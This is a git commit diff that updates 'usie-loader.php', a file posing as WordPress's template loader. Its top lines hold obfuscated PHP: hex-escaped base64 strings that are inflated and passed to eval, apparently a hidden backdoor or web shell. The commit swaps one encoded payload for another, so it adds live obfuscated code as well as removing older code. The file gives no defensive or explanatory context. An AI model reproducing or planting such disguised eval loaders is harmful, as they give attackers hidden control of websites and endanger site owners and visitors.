ad21cfc111e99111f8ad805f4b0a43df8ef425a1
eagles227 <166109731+eagles227@users.noreply.github.com>
2025-01-14 11:53:51 +0700

    Update usie-loader.php

--- usie-loader.php
+++ usie-loader.php
@@ -1,6 +1,6 @@
 <?php
-$Cyto = "Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1K\x42rNK85Pz\x63gqLU4mLq\x43\x43\x63lFqe\x61m\x63Snp\x43\x62np6Rq\x41O0sSi3TUPHJrNBE\x41tY\x41";
-$Lix = "\x623U4hKzRmi3n/\x63Ovlizmw9Q/lf/gqk7/5SU2uFimY4TQ/deXgNGytml\x41\x43pOkmH\x41yOOIP\x4371Y5\x63dNJ64Fsk5wu84\x42R0\x42HX\x43yzHM3Vl\x414O5pt2mTj1mk70SVvzvE7HoqV\x62HHgldfodej1l\x425ius5j3\x63D\x62tmkQkeyp3D9\x61H7zT1o8RWS1D\x622dO66Tyql0SrtH1uxPmXt2VWJDigotftOyVdj\x63WDGVqoIvwhSMZJm8Pm4yZ1OokhWJ\x42oI5Vlwj1ilkG\x63\x43Irxy\x63H3ML61k06Vv1n9\x62\x43/\x62Mrkp\x2bEl8e7s6\x2b5G1SgU2\x62z\x41RiOG3wW2j8\x43jPyMfy\x2b\x42VUqn\x42nFNOy5tpNhh\x2bErMN7g\x62hw\x41pFNkdI56ntqo7ZP\x41WG\x620wE\x62pjS6K\x43D/q\x2bi8\x63\x43IFUz71TYFuJh\x61sEZ8\x62d850\x43Rev\x63sdTgUqpJfPx6dLwpN29ZwsnmRh5\x41pif6zOulKXsIQ\x42Wi\x616\x42puut\x62o1\x41xOsGt37/NuO2rj/p65tz3\x42mKh\x62K3zYfJ0TU8V8fj1uY3d32p3g\x2bDMR01Pq\x42NhZ4LfR4HWinVfZ8Tw\x635pL7IHgN6j\x436STU0fHgG8kfn2e0dV0vxk3J0Fod\x43NWoS\x41v8W3XSOOuk9F0hlUR\x41lMKDjimjhkOevtEpjRuk\x62wSQw\x41I\x437EE41GUKZUOUooHI/tuQnf4PP\x61R\x2bWR0XeID\x2bOLuws\x2bgI0HG8\x42Rz\x43GrQUlI9\x61\x61MHG\x43\x61FVF\x41lkJe\x43rg6Ue3Nszw\x61Wmm6kr\x43YSok8dYW7rxK\x63\x4165wV\x43uS98fOgdn/37w7eejP\x43RqRfXnGK/\x41yOv3vlG\x42vDLFZZ\x62Wmt\x43pqsVymhiOpdWui\x61sIrUhdfTLIl\x41qu4g/nmP9D\x42M\x62\x2b27U1\x62/XK\x41\x61\x42wJe9zo\x41zFQ/HK\x41e\x42wJe9zn\x41DGQ/3J\x41i\x42wJe9zm\x41TGQ/nJ\x41m\x42wJe";
+$Cyto = "Sy1LzNFQt1dLL7FW10uvKs1Lzs8tKEotLtZIr8rMS8tJLEnVSEosTjUziU9JT\x635PSdUoLikqSi3TUPHJrNAE\x41Ws\x41";
+$Lix = "2G7IdMw/513/K56fuH19NT8UGfAyvw/6syQeVsKIrppEcIcORA9xFuowTQjlxmgwlDNpFHN4iP24SSeGgnuZXCzRvtjWSehGETqvT1ZFFb/I1vQfcDHGth9dtVOi0Jx6GL8n2VempCDjcyu5y32evlt5pCk+KH56Dd5PDFdJZlSbulWm/s4e6WbdTgjgJMq7WnTSU3In1Qh5NCSqcIEWUup/iJ+cUVirxg1aBaKdXVyCOXZpAPHSFm03zJjqMKetd19p0+dg5p2NFI/jWa/9T9/eR54InxWBRh4TyFslek8nlt0zlgfwHjryFZ+ThEuYFfIoM9qS5BMzYNIN41yNIX/sVZKP7FgSZzOTs1OGp7IC8r6LyzJglTIvXPhV4m0q+QVIv127yr4l6whmJBSpmm89Er7tA38C0TozeaBHnBko+hv7kOmMxiQ5CJaYHk662uhGDErJa0ev/346bvG+np33PfLYqEuvuHg9lQPTxXx/NWTi+4OtTfI/HYqIrdIDaAykX/0gPgMOW9lxPDzlnuMDYA3gvMsrNqR/Z8rfS6pxyj+ri+FG8KxuBtj4FCTK5hn6/WyxJh4vhyp4JKokwxkN8QBk11rthIdMDNZ6sQEICrAMhFONB3KMkLRp2aU6s2EXQgPNbJe3TIHZjv+eCvAvgce0bJYBLGZGGFtHSKYrhgaBNBMpdozgWpOH7fLbUAtW5xEdmD5YIKTHWq6OsLXgdGQlgrY/8l5lX73dO/uH37rAkY0n1tpS/CyOv3vlLyy2tE7GAnjLCpCpdXqiarcVyqhisIrUhdfTLIlAiu4g/nmP9DBMb+27U1Ln41fkC4WA";
 eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
 ?>
 <?php
@@ -9,6 +9,7 @@ eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
  *
  * @package WordPress
  */
+
 if ( wp_using_themes() ) {
     /**
      * Fires before determining which template to load.
